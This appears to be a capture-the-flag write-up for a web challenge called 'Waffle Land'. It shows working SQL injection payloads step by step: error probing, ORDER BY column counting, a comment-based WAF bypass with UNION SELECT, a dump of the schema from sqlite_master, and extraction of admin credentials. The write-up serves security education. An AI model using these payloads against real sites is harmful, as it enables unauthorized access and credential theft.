---
layout: post
title: "Waffle Land"
author: "shreyas-sriram"
tags: ['Web']
---

We got hacked, but our waffles are now safe after we mitigated the vulnerability.

Connect here:<br/>
[http://jh2i.com:50024](http://jh2i.com:50024)

## Solution
* Exploring the page, we find that it is mostly static except for the `Search` and `Signin` functionality
* Checking for SQL Injection (SQLi) in both, we find that the `Search` functionality is vulnerable to SQLi
* SQLi can be detected by entering input as `'`<br/>

**Payload**
```
'
```

**Response**
```
Bad Request
(sqlite3.OperationalError) unrecognized token: "'"
[SQL: select * from product where name like '%'%']
(Background on this error at: http://sqlalche.me/e/13/e3q8)
```

* It can be seen that `sqlite` is used as database
* All we have to do is inject and obtain data<br/>

**SQL Injection Exploitation Steps**
* Detect vulnerability :
	* already done
* Find type of injection :
	* we know the response is gotten back
* Find number of columns returned :
	* Use `ORDER BY <column-number>`
	* `--;` is used to end the SQL statement<br/>

**Payload**
```
' ORDER BY 10 --;
````

**Response**
```
Bad Request
(sqlite3.OperationalError) 1st ORDER BY term out of range - should be between 1 and 5
[SQL: select * from product where name like '%' ORDER BY 10 --;%']
(Background on this error at: http://sqlalche.me/e/13/e3q8)
```

* Find the injectable columns :
	* Use `UNION SELECT 1,2,3,4,..,x`
	* In this case, we get `403 Forbidden`
	* Probably there is a WAF (Web Application Firewall) checking inputs, this needs to be bypassed
	* Using SQL comments found [here](https://incogbyte.github.io/sqli_waf_bypass/), we can bypass the WAF
	* From the response image below, we see that `columns 2, 3, 4` are injectable

**Payload**
```
'/**/UNION/**/SELECT/**/1,2,3,4,5 --;
````

**Response**
![alt-text]({{site.baseurl}}/assets/Waffle-Land/vuln-cols.png)

* Exploit the columns to extract data :
	* Use `sql FROM sqlite_master` to get the `TABLE definitions`
	* We get two TABLES - `product` and `user`
	* `TABLE user` is what we are interested in<br/>

**Payload**
```
'/**/UNION/**/SELECT/**/1,sql,3,4,5 FROM sqlite_master --;
```

**Response**
```
CREATE TABLE product (
	id INTEGER NOT NULL, 
	name VARCHAR(40), 
	description VARCHAR(500), 
	prize VARCHAR(10), 
	image VARCHAR(50), 
	PRIMARY KEY (id), 
	UNIQUE (name)
)

CREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(40), 
	password VARCHAR(40), 
	PRIMARY KEY (id), 
	UNIQUE (username)
)
```

* Extract data from TABLE :
	* Use `<column-names> FROM <table-names>`<br/>
	
**Payload**
```
'/**/UNION/**/SELECT/**/1,username,password,4,5 FROM user --;
```

**Response**
```
admin
$4
NT7b#ed4$J?eZ#m_
```

* Use the obtained username and password in `Signin` to get the flag

## Flag
```
flag{check_your_WAF_rules}
```